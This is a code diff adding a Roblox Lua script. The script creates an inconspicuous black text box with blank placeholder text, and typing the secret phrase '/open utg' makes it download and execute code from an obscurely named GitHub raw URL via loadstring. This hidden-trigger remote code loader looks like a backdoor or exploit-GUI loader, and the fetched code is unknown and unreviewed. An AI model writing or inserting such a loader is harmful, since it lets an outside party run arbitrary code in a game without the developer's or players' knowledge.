@@ -1,0 +1,18 @@
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local textBox = Instance.new("TextBox")
+textBox.Parent = screenGui
+textBox.Size = UDim2.new(0, 50, 0, 300)
+textBox.Position = UDim2.new(1, -60, 0, 10)
+textBox.BackgroundColor3 = Color3.new(0, 0, 0)
+textBox.TextColor3 = Color3.new(1, 1, 1)
+textBox.Text = ""
+textBox.TextScaled = true
+textBox.PlaceholderText = " "
+
+textBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed and textBox.Text == "/open utg" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xtentacion178/Dhdbdbbe/main/Thdhbdbr"))()
+    end
+end)
